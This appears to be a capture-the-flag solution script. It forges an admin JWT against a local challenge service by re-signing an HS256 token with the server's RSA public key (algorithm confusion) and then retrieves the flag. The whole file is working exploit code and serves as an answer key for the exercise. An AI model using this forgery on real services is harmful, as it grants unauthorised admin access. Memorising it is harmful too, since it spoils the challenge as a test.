#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import json
from base64 import b64encode
import hmac
import hashlib

def main():
    url = "http://localhost:8089"
    flag_regex = re.compile("(InfoSec{.+[^}]})")
    pub_key_regex = re.compile("-----BEGIN PUBLIC KEY-----[\s\S]*-----END PUBLIC KEY-----")

    # Create new session
    new_session = requests.Session()

    # Target user
    username = "Visitor"
    password = "WelcomePassword123"

    # Login user
    login_data = {'username': username, 'password': password}
    response = new_session.post(url + "/login", data = login_data)
    pub_key = re.search(pub_key_regex, response.text).group()

    # Encode JWT token according to its algorithm
    jwt_header = {'alg': "HS256"}
    jwt_payload = {'is_admin': "true"}

    # Encode header & content
    json_header = b64encode(json.dumps(jwt_header).encode('utf-8')).decode('utf-8')
    json_payload = b64encode(json.dumps(jwt_payload).encode('utf-8')).decode('utf-8')
    
    # Merge header & content
    hdr_and_payload_bytearray = f'{json_header}.{json_payload}'.encode('utf-8')

    # H256 Signature
    signature = hmac.new(pub_key.encode('utf-8'), hdr_and_payload_bytearray, hashlib.sha256).hexdigest()
    signature = b64encode(bytes(signature, encoding = 'utf-8')).decode('utf-8')

    # Prepare JWT token and cookie
    jwt_token = f"{hdr_and_payload_bytearray.decode('utf-8')}.{signature}"
    jwt_cookie = {'jwt_token': jwt_token}

    # Get the flag
    flag_response = requests.get(url + "/flag" , cookies = jwt_cookie)
    flag = flag_response.text
    
    # Write the flag to the solution file
    sol = open("solution.txt", "w")
    sol.write(flag)
    sol.close()

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass